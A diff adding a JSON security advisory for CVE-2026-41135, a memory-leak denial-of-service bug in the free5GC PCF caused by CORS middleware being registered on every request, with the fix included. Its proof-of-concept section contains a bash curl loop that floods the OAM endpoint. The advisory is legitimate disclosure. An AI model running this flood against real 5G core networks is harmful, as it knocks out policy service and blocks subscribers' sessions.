@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-98cp-84m9-q3qp",
+  "modified": "2026-04-22T20:04:05.740366Z",
+  "published": "2026-04-22T19:49:45Z",
+  "aliases": [
+    "CVE-2026-41135"
+  ],
+  "summary": "free5GC PCF: Memory Leak via CORS Middleware Registration in HTTP Handler Leads to Denial of Service",
+  "details": "## Summary\n\nA memory leak vulnerability in the free5GC PCF (Policy Control Function) allows any unauthenticated attacker with network access to the PCF SBI interface to cause uncontrolled memory growth by sending repeated HTTP requests to the OAM endpoint. The root cause is a `router.Use()` call inside an HTTP handler that registers a new CORS middleware on every incoming request, permanently growing the Gin router's handler chain. This leads to progressive memory exhaustion and eventual Denial of Service of the PCF, preventing all UEs from obtaining AM and SM policies and blocking 5G session establishment.\n\n## Details\n\n**File:** `free5gc/pcf/internal/sbi/api_oam.go`  \n**Function:** `setCorsHeader()`, called by `HTTPOAMGetAmPolicy()`\n\nThe function `setCorsHeader()` invokes `s.router.Use()` on every incoming HTTP request:\n\n```go\nfunc (s *Server) setCorsHeader(c *gin.Context) {\n    // BUG: router.Use() inside a handler — executes on every request\n    s.router.Use(cors.New(cors.Config{\n        AllowMethods:     []string{\"GET\", \"POST\", \"OPTIONS\", \"PUT\", \"PATCH\", \"DELETE\"},\n        AllowAllOrigins:  true,\n        AllowCredentials: true,\n        MaxAge:           CorsConfigMaxAge,\n    }))\n    // Redundant manual header setting\n    c.Writer.Header().Set(\"Access-Control-Allow-Origin\", \"*\")\n    c.Writer.Header().Set(\"Access-Control-Allow-Credentials\", \"true\")\n    // ...\n}\n\nfunc (s *Server) HTTPOAMGetAmPolicy(c *gin.Context) {\n    s.setCorsHeader(c) // ← called on every GET /npcf-oam/v1/am-policy/:supi\n    // ...\n}\n```\nIn the Gin framework, `router.Use()` appends a new `HandlerFunc` to the router's internal middleware slice. This operation is **not idempotent** — it does not replace existing middleware but appends a new instance on every call. After N requests, Gin executes N CORS middleware instances before reaching the actual handler:\n\nRequest N → [cors_mw_1 → cors_mw_2 → ... → cors_mw_N → actual_handler]\n\nSince `s.router` holds a permanent reference to the accumulated middleware slice, the Go garbage collector cannot free this memory. The additional issue of `AllowAllOrigins: true` combined with `AllowCredentials: true` also constitutes a CORS misconfiguration (forbidden by the CORS specification), though this is secondary to the memory leak.\n\n**Fix:** Move `router.Use(cors.New(...))` to the server initialization function (called once at startup), and remove `setCorsHeader()` from all handlers entirely:\n\n```go\n// ✅ server.go — called once at startup\nfunc (s *Server) initRouter() {\n    s.router.Use(cors.New(cors.Config{\n        AllowMethods:     []string{\"GET\", \"POST\", \"OPTIONS\", \"PUT\", \"PATCH\", \"DELETE\"},\n        AllowOrigins:     []string{\"https://trusted-origin.example.com\"},\n        AllowCredentials: false,\n        MaxAge:           CorsConfigMaxAge,\n    }))\n}\n```\n## PoC\n\n**Environment:**\n- free5GC v4.2.1 (commit `df535f55`, build `2026-03-04`)\n- PCF container IP: `10.22.22.6`, port `80`\n- Attacker: any container on the same Docker network (tested from UDM container)\n- No authentication required (OAuth2 disabled)\n\n**Step 1** — Record memory baseline:\n```bash\ndocker stats --no-stream | grep pcf\n# Output: 24.86 MiB\n```\n\n**Step 2** — Launch flood from attacker container:\n```bash\nfor i in $(seq 1 5000); do\n    curl -s http://10.22.22.6/npcf-oam/v1/am-policy/imsi-222771234567890 \u003e /dev/null \u0026\n    [ $((i % 100)) -eq 0 ] \u0026\u0026 wait \u0026\u0026 echo \"[*] $i req sent\"\ndone\nwait\n```\n\n**Step 3** — Monitor memory growth:\n```bash\nwatch -n 2 \"docker stats --no-stream | grep pcf\"\n```\n\n**Results:**\n\n| Requests sent | PCF Memory | Delta      |\n|---------------|------------|------------|\n| 0 (baseline)  | 24.86 MiB  | —          |\n| ~5,000        | 46.48 MiB  | +21.62 MiB |\n| ~10,000       | 58.59 MiB  | +12.11 MiB |\n| ~15,000       | 70.30 MiB  | +11.71 MiB |\n| ~100,000 (projected) | ~170+ MiB | OOM kill |\n\nMemory never returns to baseline between request batches, confirming permanent retention by the router's middleware chain.\n\n## Impact\n\n**Vulnerability type:** Uncontrolled Resource Consumption (Memory Exhaustion) leading to Denial of Service.\n\n**Who is impacted:** Any deployment of free5GC where the PCF OAM interface is reachable from the internal 5G core network. Since all 5G core NFs share the same Docker network by default, any compromised or attacker-controlled NF container can trigger this vulnerability without credentials.\n\n**5G service impact:** The PCF is responsible for providing AM (Access and Mobility) policies to the AMF and SM (Session Management) policies to the SMF. A DoS of the PCF prevents:\n- New UE registrations (AM policy creation fails)\n- New PDU session establishment (SM policy creation fails)\n- Policy updates for existing sessions\n\nIn a production deployment this would result in complete loss of 5G service for all subscribers served by the affected PCF instance.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/pcf",
+        "purl": "pkg:golang/github.com/free5gc/pcf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-98cp-84m9-q3qp/GHSA-98cp-84m9-q3qp.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-98cp-84m9-q3qp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41135"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
